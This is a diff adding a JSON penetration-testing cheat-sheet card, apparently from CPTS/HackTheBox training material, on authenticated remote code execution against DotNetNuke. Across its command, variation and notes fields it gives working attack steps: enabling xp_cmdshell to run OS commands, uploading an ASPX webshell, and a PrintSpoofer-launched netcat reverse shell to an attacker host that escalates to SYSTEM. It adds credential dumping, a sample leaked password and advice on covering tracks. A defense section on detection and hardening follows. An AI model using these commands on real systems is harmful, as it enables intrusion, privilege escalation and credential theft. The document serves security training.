@@ -1,0 +1,114 @@
+{
+  "id": "dnn-admin-rce",
+  "name": "DotNetNuke (DNN) - Authenticated RCE (SQL Console + File-Extension Bypass)",
+  "command": "-- DNN SuperUser > Settings > SQL console: enable and run OS commands\nEXEC sp_configure 'show advanced options', '1'; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;\nxp_cmdshell 'whoami'",
+  "description": "DotNetNuke (DNN) is the '.NET WordPress' CMS. With SuperUser/admin credentials (often pillaged from a web.config on an open share), two built-in features give code execution: the SQL console under Settings can enable xp_cmdshell for direct OS commands, and the Allowable File Extensions list can be widened to permit .asp/.aspx so an ASPX webshell can be uploaded via the File Management page. The web/SQL service typically holds SeImpersonate, so PrintSpoofer/JuicyPotato escalates straight to SYSTEM.",
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "valid-credentials"
+  ],
+  "protocols": [
+    "http",
+    "mssql"
+  ],
+  "tools": [
+    "browser",
+    "printspoofer",
+    "netcat"
+  ],
+  "tags": [
+    "dotnetnuke",
+    "dnn",
+    "cms",
+    "xp-cmdshell",
+    "webshell",
+    "file-upload",
+    "rce",
+    "aspx"
+  ],
+  "category": "Exploitation",
+  "subcategory": "DotNetNuke",
+  "certifications": [
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 28: Attacking Enterprise Networks",
+  "variations": [
+    {
+      "label": "RCE path 2 - widen Allowable File Extensions, upload ASPX webshell",
+      "command": "# Settings > Security > More > More Security Settings -> add asp,aspx to Allowable File Extensions -> Save\n# then http://<ip>/admin/file-management -> upload webshell.asp -> right-click > Get URL -> browse to run commands"
+    },
+    {
+      "label": "Escalate to SYSTEM via SeImpersonate (files land in Portals\\0)",
+      "command": "c:\\DotNetNuke\\Portals\\0\\PrintSpoofer64.exe -c \"c:\\DotNetNuke\\Portals\\0\\nc.exe <lhost> 443 -e cmd\""
+    }
+  ],
+  "examples": [
+    {
+      "label": "Fingerprint DNN + find the admin login",
+      "command": "curl http://<ip>/\n# browse http://<ip>/Login?returnurl=%2fadmin"
+    },
+    {
+      "label": "Credentials commonly pillaged from a DNN web.config on an open NFS/SMB share",
+      "command": "# <username>Administrator</username> <password><value>D0tn31Nuk3R0ck$$@123</value></password>"
+    },
+    {
+      "label": "Confirm command execution through the SQL console",
+      "command": "xp_cmdshell 'whoami'   # -> nt service\\mssql$sqlexpress (or IIS APPPOOL\\DotNetNukeAppPool)"
+    }
+  ],
+  "notes": "Two independent RCE routes once logged in as a DNN SuperUser: (1) the SQL console (Settings page) enables xp_cmdshell and runs OS commands directly - the MSSQL service context usually has SeImpersonate; (2) if the SQL console is locked down, extend Allowable File Extensions to include asp/aspx and upload an ASPX webshell through /admin/file-management, then 'Get URL' to execute. Uploaded files land in C:\\DotNetNuke\\Portals\\0 - re-widen extensions to also allow .exe so you can drop PrintSpoofer64.exe + nc.exe and pivot SeImpersonate -> NT AUTHORITY\\SYSTEM. From SYSTEM: reg save SAM/SYSTEM/SECURITY -> secretsdump for local + cached domain creds. This is the DEV01 foothold in the M28 capstone; it reuses mssql-enable-xpcmdshell and seimpersonate-printspoofer but the DNN-specific admin/upload vectors are unique.",
+  "references": [
+    {
+      "title": "DNN - Allowable file types and extensions for upload",
+      "url": "https://dnnsupport.dnnsoftware.com/article/57495-allowable-file-types-and-extensions-for-upload"
+    },
+    {
+      "title": "HTB Academy - Attacking Enterprise Networks",
+      "url": "https://academy.hackthebox.com/module/details/163"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "nfs-enum",
+      "note": "Enumerate/mount the open NFS share that leaks the DNN web.config credentials.",
+      "rel": "prereq"
+    },
+    {
+      "id": "mssql-enable-xpcmdshell",
+      "note": "The xp_cmdshell enablement this card drives from the DNN SQL console.",
+      "rel": "alternative"
+    },
+    {
+      "id": "seimpersonate-printspoofer",
+      "note": "Escalate the webshell/SQL context (SeImpersonate) to SYSTEM.",
+      "rel": "escalation"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "prerequisites": "Valid DNN SuperUser/administrator credentials (frequently recovered from a web.config left on an anonymously accessible NFS/SMB share). HTTP access to the DNN admin UI.",
+    "why_it_works": "DNN ships two admin features that are code-execution primitives by design: a SQL console that can toggle and call xp_cmdshell, and a configurable upload allow-list that can be widened to server-executable extensions (.asp/.aspx). Neither is a CVE - it is built-in functionality abused with admin rights.",
+    "misconfiguration": "web.config with cleartext admin password exposed on an open share; SuperUser access to the SQL console; upload allow-list editable to include executable extensions; MSSQL/app pool running with SeImpersonate.",
+    "impact": "Remote code execution on the DNN/IIS host as the service account, then SeImpersonate -> SYSTEM, local SAM + cached domain credentials, and a foothold into the AD domain.",
+    "detection": "MSSQL: sp_configure changes enabling xp_cmdshell; xp_cmdshell process spawns (sqlservr.exe -> cmd.exe). Web: uploads of .asp/.aspx to Portals\\0 or /admin/file-management; changes to Allowable File Extensions; new admin logins from unusual IPs.",
+    "artifacts": "SQL Server error/audit log (xp_cmdshell enabled); IIS logs showing webshell requests; new .asp/.aspx/.exe files under C:\\DotNetNuke\\Portals\\0; DNN event log admin-login and settings-change entries.",
+    "vulnerable_config": "# DNN admin can run Settings > SQL console\n# Allowable File Extensions editable to asp,aspx,exe\n# web.config readable on an 'everyone' NFS export",
+    "secure_config": "# Remove/secure web.config from all shares; no anonymous NFS/SMB exports\n# Restrict DNN SuperUser; disable the SQL console for non-DBA roles\n# Keep upload allow-list to non-executable types; run MSSQL app pool without SeImpersonate\n# Enforce least privilege on the service account",
+    "prevention": "Never store cleartext creds in web.config on shares; lock down anonymous file shares. Restrict SuperUser accounts and disable/limit the SQL console. Keep the upload allow-list free of executable extensions. Remove SeImpersonate from service accounts where possible. [MITRE M1035, M1022, M1026, M1018]",
+    "evasion": "Rename the webshell to an innocuous name; delete PrintSpoofer/nc after obtaining SYSTEM; run xp_cmdshell sparingly to avoid noisy sqlservr->cmd spawns.",
+    "sources": [
+      "HTB M28",
+      "MITRE T1190",
+      "MITRE T1505.003",
+      "MITRE T1059"
+    ]
+  }
+}
